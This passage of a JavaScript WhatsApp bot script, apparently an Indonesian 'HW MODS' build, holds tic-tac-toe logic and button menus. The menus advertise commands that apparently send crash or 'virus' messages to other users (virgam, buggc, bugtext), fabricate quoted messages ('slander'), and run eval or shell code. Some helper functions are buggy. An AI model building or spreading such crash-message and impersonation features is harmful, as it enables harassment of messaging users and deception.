    if (board[0] == x && board[4] == x && board[8] == x) return x
    if (board[2] == x && board[4] == x && board[6] == x) return x
    if (board[0] == o && board[4] == o && board[8] == o) return o
    if (board[2] == o && board[4] == o && board[6] == o) return o

    // Vertikal
    if (board[0] == x && board[3] == x && board[6] == x) return x
    if (board[1] == x && board[4] == x && board[7] == x) return x
    if (board[2] == x && board[5] == x && board[8] == x) return x
    if (board[0] == o && board[3] == o && board[6] == o) return o
    if (board[1] == o && board[4] == o && board[7] == o) return o
    if (board[2] == o && board[5] == o && board[8] == o) return o
    return false
}

// function for generate board for x and o or number
const generateBoard = async(board) => {
    var texts = ""
    var count = 0
    for (var x of board) {
        if (count % 3 == 0) {
            texts += "\n               "
        }
        texts += x
        count += 1
    }
    return texts
}
const checkWin = (sender) => {
            let found = false
            for (let wn of _win) {
                if (wn.jid === sender) {
                    let winCounts = winawal - wn.win
                    if (winCounts <= 0) return Haikal.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, win: 0 }
                _win.push(obj)
                fs.writeFileSync('./database/tttwin.json', JSON.stringify(_win))
                return `${winCounts}`
            }
        }
        const checkLose = (sender) => {
            let found = false
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    let loseCounts = loseawal - ls.lose
                    if (loseCounts <= 0) return Haikal.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
            if (found === false) {
                let obj = { jid: sender, lose: 0 }
                _lose.push(obj)
                fs.writeFileSync('./database/tttlose.json', JSON.stringify(_lose))
                return `${loseCounts}`
            }
        }
        if (tictactoe.hasOwnProperty(senderNumber) && ["Nyerah", "nyerah"].includes(budy) && !isCmd) {
        orangnye = sender
        teks = `@${orangnye.split("@")[0]} Menyerah\n_Yahaha cupu abiez_`
        return Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
                        delete tictactoe[senderNumber]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync("./temp/" + from + ".json");
        })
        }
       
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            var { enemy, mode, board, step } = tictactoe[senderNumber]
            if ([X, O].includes(board[Number(budy) - 1])) return await reply(`Angka ${budy} telah diisi`)
            var data = tictactoe[senderNumber]
            data["enemy"] = senderNumber
            mode = mode == X ? O : X
            data["mode"] = mode
            data["board"][Number(budy) - 1] = data["mode"]
            data["step"] += 1
            var player1 = enemy
            var player2 = senderNumber
            if (step % 2 == 0) {
                player1 = senderNumber
                player2 = enemy
            } else {
                mode = data["mode"] == X ? O : X
            }
            tictactoe[enemy] = data
            delete tictactoe[senderNumber]
            var teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${player1.split("@")[0]} (${mode})`
            mode = mode == X ? O : X
            var text2 = `\n\n•> Player 2 : @${player2.split("@")[0]} (${mode})`
            var test = `\n_ketik nyerah untuk menyerah_`
            board = await generateBoard(data["board"])
            var win = await getWin(data["board"])
            if (win) {
                teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
                if (win == mode) {
                    teks += `•> Lose : @${player1} 👻\n\n`
                    teks += board
                    teks += `\n\n•> Win : @${player2} 🎉\n_fix tictactoe by HW MODS 2021_`
                    return Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player2}@s.whatsapp.net`, 1)
                        getLose(`${player1}@s.whatsapp.net`, 1)
                    })
                } else {
                    teks += `•> Win : @${player1} 🎉\n\n`
                    teks += board
                    teks += `\n\n•> Lose : @${player2} 👻\n_fix tictactoe by HW MODS 2021_`
                    return Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                        delete tictactoe[enemy]
                        fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                        fs.unlinkSync('./temp/' + from + '.json')
                        getWins(`${player1}@s.whatsapp.net`, 1)
                        getLose(`${player2}@s.whatsapp.net`, 1)
                    })
                }
            }
            if (data["step"] == 9) {
                teks = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n`
                teks += `•> Draw : @${player1} 🦁\n\n`
                teks += board
                teks += `\n\n•> Draw : @${player2} 🐯\n_fix tictactoe by HW MODS 2021_`
                return Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                    delete tictactoe[enemy]
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                    fs.unlinkSync('./temp/' + from + '.json')
                })
            }
            player2 == senderNumber ? teks += tunjuk : text2 += tunjuk
            teks += "\n"
            teks += board
            teks += text2
            teks += test
            return Haikal.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
                fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
            })
        }
        if (fs.existsSync(`./temp/${from}.json`)) {
	tttSkuy = setTtt(`${from}`)
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (tttSkuy.status) return reply(`Game telah dimulai sebelumnya!`)
		tttSkuy.status = true
		rand0m = [ tttSkuy.Z, tttSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
		nantang = O
                    pelawan = X
                
                var board = ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣"]
                var penantang = `${tttSkuy.Z}@s.whatsapp.net`
                var lawan = `${tttSkuy.Y}@s.whatsapp.net`
                tesk = `🎮🎭 \`\`\`TICTACTOE\`\`\` 🎭🎮\n•> Player 1 : @${penantang.split("@")[0]} (${nantang}) ${tunjuk}\n`
                var count = 0
                for (var x of board) {
                    if (count % 3 == 0) {
                        tesk += "\n               "
                    }
                    tesk += x
                    count += 1
                }
                tesk += `\n\n•> Player 2 : @${lawan.split("@")[0]} (${pelawan})\n_fix tictactoe by HW MODS 2021_`
                return Haikal.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
                    data["enemy"] = lawan.split("@")[0]
                    data["mode"] = pelawan
                    data["board"] = board
                    data["step"] = 0
                    tictactoe[penantang.split("@")[0]] = data
                    fs.writeFileSync("./database/tictactoe.json", JSON.stringify(tictactoe))
                })
                fs.unlinkSync("./temp/" + from + ".json");
	} else if (sender == `${tttSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Haikal.sendMessage(from, `「 *Game Tictactoe Rejected* 」\n\n• @${tttSkuy.Y} yahaha cupu lo`, text, {quoted: mek, contextInfo: { mentionedJid: [tttSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./temp/" + from + ".json");
	}
}
//========================================================================================================================//
		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedLoca = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocs = type === 'extendedTextMessage' && content.includes('documentMessage')
        const isQuotedTeks = type === 'extendedTextMessage' && content.includes('quotedMessage')
        const isQuotedTag = type === 'extendedTextMessage' && content.includes('mentionedJid')
        const isQuotedProd = type === 'extendedTextMessage' && content.includes('productMessage')
        const isQuotedReply = type === 'extendedTextMessage' && content.includes('Message')
        if (!isCmd && mek.message) {
             for (let i of totalchat) {
          Haikal.updatePresence(i.jid, Presence.recording)
                   }
             }
      	if (!isGroup && isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;32mEXEC\x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
		if (!mek.key.fromMe && !isOwner && banChats === true) return
		//Anti Bot Recode By HW MODS WA
		if (atibot === true) return
const isBtMsg = (type == 'buttonsResponseMessage') ? mek.message.buttonsResponseMessage.selectedDisplayText : ''
const isStMsg = (type == 'listResponseMessage') ? mek.message.listResponseMessage.title : ''
// Stick Cmd
switch (isStc) {
case "c1f40a203939746b645c97e107d97c4ed66793acdbcd541905b4e9d7ecf8ab69": // JADI ADMIN
if (!isOwner) return
if (!isBotGroupAdmins) return
if (!isGroup) return
mentioned = sender
if (mentioned.length > 1) {
teks = `@${mentioned.split('@')[0]} Sekarang Admin!`
Haikal.sendMessage(from, teks, text, {contextInfo:{mentionedJid:[mentioned]}})
Haikal.groupMakeAdmin(from, [mentioned])
} else {
Haikal.sendMessage(from, `@${mentioned.split('@')[0]} Sekarang Admin!`, text, {contextInfo:{mentionedJid:[mentioned]}})
Haikal.groupMakeAdmin(from, [mentioned])
}
break
}
// Text Cmd
switch (command) {
// List Menu ( HW MODS WA )
case 'intro':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG
┏━━⊱
┣❏NAMA :   
┣❏UMUR :  
┣❏KOTA : 
┣❏NEGARA :
┣❏ALASAN GUNAKAN BOT :
┗━━⊱
┏━━⊱
┣❏ WELCOME BOT
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - DONASI BOT -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
- DONASI -
DANA : 6285714170944
PAYPAL : https://www.paypal.me/deni97194
PULSA : wa.me/6285714170944

- THANKS YOU BOT -
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'menu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG
┏━━⊱
┣❏NAMA :   
┣❏UMUR :  
┣❏KOTA : 
┣❏NEGARA :
┣❏ALASAN GUNAKAN BOT :
┗━━⊱
┏━━⊱
┣❏ COMMAND MENU
┣❏ MAKER <makermenu>
┣❏ SOUND <menusound>
┣❏ TEBAK <tebak>
┣❏ BUG <bugmenu>
┣❏ INTRO <intro>
┣❏ NEW <hwmenu>
┣❏ OLD <modsmenu>
┣❏ KODEKERAS <kodekeras>
┣❏ MAUSANGE <mausange>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
┏━━⊱
┣❏ ALL MENU ONLY BUTTON
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - THANKS YOU -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
WELCOME TO BOT HW ✓
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'modsmenu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG
┏━━⊱
┣❏NAMA :   
┣❏UMUR :  
┣❏KOTA : 
┣❏NEGARA :
┣❏ALASAN GUNAKAN BOT :
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU MODS -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
┏━━⊱ 
═════{*SETTINGS MENU*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}setthumb <reply>
┣❏ ${prefix}settarget <62xxxx>
┣❏ ${prefix}setfakeimg <reply>
┣❏ ${prefix}setreply <query>
┣❏ ${prefix}sticker <image/video>
┣❏ ${prefix}swm <author|packname>
┣❏ ${prefix}take <author|packname>
┣❏ ${prefix}fdeface <reply>
┣❏ ${prefix}darkjokes <query>
┣❏ ${prefix}emoji <emoji>
┣❏ ${prefix}tts id <reply>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU HW -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						

┏━━⊱
═════{*GROUP MENU*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}antilink <1/0>
┣❏ ${prefix}setname <query>
┣❏ ${prefix}setdesc <query>
┣❏ ${prefix}groupinfo [Info]
┣❏ ${prefix}revoke [Revoke]
┣❏ ${prefix}linkgc [Link Group]
┣❏ ${prefix}group <open/close>
┣❏ ${prefix}add <62xxxx>
┣❏ ${prefix}kick <tag>
┣❏ ${prefix}sider <reply>
┣❏ ${prefix}bc <query>
┣❏ ${prefix}promote <reply>
┣❏ ${prefix}demote <reply>
┣❏ ${prefix}getname <reply>
┣❏ ${prefix}getbio <reply>
┣❏ ${prefix}getpic <query>
┣❏ ${prefix}getp [From]
┣❏ ${prefix}get <link>
┣❏ ${prefix}q [Copy Paste]
┣❏ ${prefix}inspect <link>
┣❏ ${prefix}searchtext <query>
┣❏ ${prefix}searchgc <query>
┣❏ ${prefix}penjara <nama group>
┣❏ ${prefix}detikvn <query>
┣❏ ${prefix}detikvideo <query>
┣❏ ${prefix}tohuruf <query>
┣❏ ${prefix}fliptext <query>
┣❏ ${prefix}volume <query>
┗━━⊱
┏━━⊱
═════{*GAME MENU*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}tictactoe <@tag>
┣❏ ${prefix}cekhistory [Status]
┣❏ ${prefix}delsesi <game>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU WA -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
═════{*COMMAND*}═════
┏━━⊱
┣❏ => [eval async]
┣❏ > [eval]
┣❏ Menu [List Menu]
┣❏ _>/< [Kudet]
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'hwmenu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG
┏━━⊱
┣❏NAMA :   
┣❏UMUR :  
┣❏KOTA : 
┣❏NEGARA :
┣❏ALASAN GUNAKAN BOT :
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU MODS -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
═════{*OWNER*}═════
┏━━⊱
├ ❏ ${prefix}setprefix <query>
├ ❏ ${prefix}setlink <query>
├ ❏ ${prefix}leave <id>
├ ❏ ${prefix}self [Self]
├ ❏ ${prefix}public [Public]
├ ❏ ${prefix}off <query>
├ ❏ ${prefix}intro [intro]
├ ❏ ${prefix}on [Online]
├ ❏ ${prefix}status [Status]
├ ❏ ${prefix}antibug <on/off>
├ ❏ ${prefix}antitag <on/off>
├ ❏ ${prefix}autoread <query>
├ ❏ ${prefix}anticall <on/off>
├ ❏ ${prefix}antidelete <on/off>
├ ❏ ${prefix}join <link>
├ ❏ ${prefix}restart [Restart]
┗━━⊱
┏━━⊱ 
═════{*CONVERT*}═════
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU HW -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						

┏━━⊱
═════{*UP STORY*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}upswteks <query>
┣❏ ${prefix}upswimage <image>
┣❏ ${prefix}upswvideo <video>
┗━━⊱
┏━━⊱
═════{*TAG*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}tag <62xxxx>
┣❏ ${prefix}tagall <query>
┣❏ ${prefix}hidetag <query>
┣❏ ${prefix}kontag <62xxxx>
┣❏ ${prefix}sticktag <reply>
┣❏ ${prefix}totag <reply>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							},
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - MENU WA -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
═════{*DOWNLOAD*}═════
┏━━⊱
┣❏ ${prefix}ytsearch <query>
┣❏ ${prefix}playstore <query>
┣❏ ${prefix}igstalk <query>
┣❏ ${prefix}play <query>
┣❏ ${prefix}video <query>
┣❏ ${prefix}ytmp3 <link>
┣❏ ${prefix}ytmp4 <link>
┣❏ ${prefix}ig <link>
┣❏ ${prefix}twmp4 <link>
┣❏ ${prefix}twmp3 <link>
┣❏ ${prefix}ttmp4 <link>
┣❏ ${prefix}ttmp3 <link>
┣❏ ${prefix}fbmp4 <link>
┣❏ ${prefix}fbmp3 <link>
┣❏ ${prefix}brainly <query>
┣❏ ${prefix}image <query>
┣❏ ${prefix}toimg <reply>
┣❏ ${prefix}tomp3 <reply>
┣❏ ${prefix}tomp4 <reply>
┣❏ ${prefix}slow <reply>
┣❏ ${prefix}kalkulator <kalkulator>
┣❏ ${prefix}fast <reply>
┣❏ ${prefix}reverse <reply>
┣❏ ${prefix}tourl <reply>
┗━━⊱
┏━━⊱
═════{*OTHER*}═════
┗━━⊱
┏━━⊱
┣❏ ${prefix}blocklist [List]
┣❏ ${prefix}p [Troli]
┣❏ ${prefix}listgroup [List]
┣❏ ${prefix}term <code>
┣❏ ${prefix}owner [Owner]
┣❏ ${prefix}deletepc [Clear]
┣❏ ${prefix}hbd <date>
┣❏ ${prefix}slander <query>
┣❏ ${prefix}slanderpm <query>
┣❏ ${prefix}kontak <62xxxx>
┣❏ ${prefix}styletext <query>
┣❏ ${prefix}nowa <628xxxx>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'karakter':
if (!q) return reply('yg mau di cari apa?')
pinterest(`${q}`).then( data => {
const amsulah = data.result
const pimterest = amsulah[Math.floor(Math.random() * amsulah.length)]
sendMediaURL (from ,pimterest , `karakter : ${q}`)
})
				    break
case 'bugmenu':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
					▬▭▬▭▬▭▬▭▬▬▭▬▭						
══{*VIRGAM OLD*}══
┏━━⊱
┣❏ ${prefix}virgam
┣❏ ${prefix}virgam1
┣❏ ${prefix}virgam2
┣❏ ${prefix}virgam3
┗━━⊱
┏━━⊱ 
══{*VIRGAM NEW*}══
┗━━⊱
┏━━⊱
┣❏ ${prefix}Assalamualaikum
┣❏ ${prefix}kal
┣❏ ${prefix}pp
┣❏ ${prefix}bang
┣❏ ${prefix}alah
┗━━⊱
┏━━⊱ 
══{*BUG BOT*}══
┗━━⊱
┏━━⊱
┣❏ ${prefix}hay
┣❏ ${prefix}psp
┣❏ ${prefix}pcp
┣❏ ${prefix}pvp
┣❏ ${prefix}hw1
┣❏ ${prefix}jadi toge <reply sticker>
┣❏ ${prefix}jaditahu <gambar/sticker>
┣❏ ${prefix}buglokasi
┣❏ ${prefix}buggc
┣❏ ${prefix}bugtext <jumlah>
┗━━⊱
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
						"footerText": "https://youtube.com/channel/UCa37vxxUI-XULKw_sHb4A5g",
						"buttons": [
							{
								"buttonId": "HAIKAL",
								"buttonText": {
									"displayText": ` - THANKS YOU -
❏HW MODS WA❏
▬▭▬▭▬▭▬▭▬▬▭▬▭						
JANGAN PAKE SEMBARANGAN
▬▭▬▭▬▭▬▭▬▬▭▬▭`,
								},						
								"type": "RESPONSE"
							}
						],
						"headerType": "IMAGE"
					}
}, {quoted:mek})
Haikal.relayWAMessage(res)
break
case 'kodekeras':
res = await Haikal.prepareMessageFromContent(from,{
					"buttonsMessage": {
						"text": "",
					"imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                         "jpegThumbnail": fs.readFileSync('./stik/Ahhikal.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
					 },
						"contentText": `❏HW MODS WA❏
						▬▭▬▭▬▭▬▭▬▬▭▬▭
SELAMAT DATANG
Note : EASY MODE = Sange, Biasa Aja, Mental Lemah :v
==============================
MEDIUM MODE = Bisa bikin sange, Lumayan nyesek, Rasanya pengen coli teros, Mental Batu
==============================
HARD MODE = Menyebabkan amnesia, insomnia, hipotermia, kejang", serangan jantung, diare, pendarahan hebat, buang air tidak terkendali, rasa ingin baku hantam, frustasi, depresi, emosi tidak tertahan kan, sakit hati (ambyar), Mental Baja
==============================
▬▭▬▭▬▭▬▭▬▬▭▬▭
JANGAN LUPA SUBSCRIBE`,
